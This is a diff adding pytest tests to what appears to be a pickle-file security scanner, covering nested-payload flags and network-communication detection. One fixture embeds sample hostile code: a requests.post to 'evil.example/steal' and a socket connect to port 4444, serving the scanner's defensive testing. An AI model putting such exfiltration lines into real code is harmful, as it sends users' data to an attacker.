@@ -163,6 +163,66 @@ def test_expensive_raw_skip_requires_clean_complete_rust_result() -> None:
     assert scanner._should_skip_expensive_raw_detectors(suspicious_result, b"A" * 128) is False
 
 
+def test_data_only_nested_pickle_notice_is_modelaudit_issue(tmp_path: Path) -> None:
+    path = tmp_path / "nested-data.pkl"
+    inner_payload = pickle.dumps({"tiny": "payload"}, protocol=4)
+    path.write_bytes(pickle.dumps({"data": inner_payload}, protocol=4))
+
+    result = PickleScanner().scan(str(path))
+
+    nested_issues = [
+        issue
+        for issue in result.issues
+        if issue.rule_code == "S213" and issue.details.get("pickle_notice_code") == "nested_payload_detected"
+    ]
+    assert nested_issues
+    assert nested_issues[0].severity == IssueSeverity.CRITICAL
+
+
+def test_expensive_raw_prefilter_emits_network_pass_for_clean_pickle(tmp_path: Path) -> None:
+    path = tmp_path / "clean.pkl"
+    path.write_bytes(pickle.dumps({"model_state": {"layer.weight": [1.0, 2.0, 3.0]}}, protocol=4))
+
+    result = PickleScanner().scan(str(path))
+
+    assert result.metadata["pickle_expensive_raw_detectors_skipped"] is True
+    network_passes = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection"
+        and check.message == "No network communication patterns detected"
+    ]
+    assert len(network_passes) == 1
+
+
+def test_native_findings_do_not_suppress_network_raw_detector(tmp_path: Path) -> None:
+    path = tmp_path / "network-code.pkl"
+    path.write_bytes(
+        pickle.dumps(
+            {
+                "code": b"""
+import socket
+import requests
+
+requests.post('http://evil.example/steal')
+socket.connect(('192.168.1.100', 4444))
+""",
+            },
+            protocol=4,
+        )
+    )
+
+    result = PickleScanner().scan(str(path))
+
+    network_issues = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status.value == "failed"
+    ]
+    assert network_issues
+    assert not result.metadata.get("pickle_network_raw_detector_skipped")
+
+
 def test_expensive_raw_prefilters_preserve_secret_and_network_findings(tmp_path: Path) -> None:
     path = tmp_path / "seeded.pkl"
     payload = {
